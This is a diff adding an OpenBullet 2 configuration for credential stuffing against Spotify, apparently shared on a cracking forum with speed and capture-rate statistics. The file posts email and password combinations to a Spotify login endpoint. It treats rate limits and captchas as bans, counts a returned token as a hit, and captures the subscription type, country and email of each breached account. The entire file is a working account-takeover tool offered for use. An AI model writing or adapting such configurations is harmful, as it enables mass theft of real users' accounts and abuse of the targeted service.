@@ -1,0 +1,33 @@
+# OpenBullet 2 config — Spotify OpenBullet config v14
+# Target: Spotify   Tool: OpenBullet 2
+# Uploader: user #7
+# CPM: 2200   Capture rate: 0.41
+# ============================================================
+
+BLOCK:HttpRequest
+  url = "https://api.spotify.com/v1/auth/login"
+  method = POST
+  headers {
+    "User-Agent" = "<UA>"
+    "Content-Type" = "application/json"
+    "Accept" = "application/json"
+  }
+  body {
+    "{\"email\":\"<INPUT>\",\"password\":\"<PASS>\"}"
+  }
+ENDBLOCK
+
+BLOCK:Keycheck
+  banOn = "429"
+  banOn = "captcha"
+  successOn = "\"token\":\""
+  failureOn = "\"error\""
+ENDBLOCK
+
+BLOCK:Parse
+  "\"subscription\":\"(.*?)\"" -> CAPTURE "Subscription"
+  "\"country\":\"(.*?)\"" -> CAPTURE "Country"
+  "\"email\":\"(.*?)\"" -> CAPTURE "Email"
+ENDBLOCK
+
+# config-id: 247281
